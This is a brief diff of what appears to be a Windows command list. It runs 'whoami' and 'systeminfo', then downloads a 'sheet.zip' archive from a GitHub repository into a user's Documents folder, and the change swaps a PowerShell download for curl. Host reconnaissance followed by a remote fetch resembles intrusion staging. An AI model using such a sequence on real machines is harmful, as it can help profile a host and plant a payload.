@@ -1,3 +1,3 @@
 whoami
 systeminfo
-powershell -Command "Invoke-WebRequest -Uri 'https://github.com/0xHumanDev/oxhuman/raw/main/sheet.zip' -OutFile 'C:\Users\HP ZBook\Documents\sheet.zip'"
+curl -L -o "C:\Users\HP ZBook\Documents\sheet.zip" "https://github.com/0xHumanDev/oxhuman/raw/main/sheet.zip"
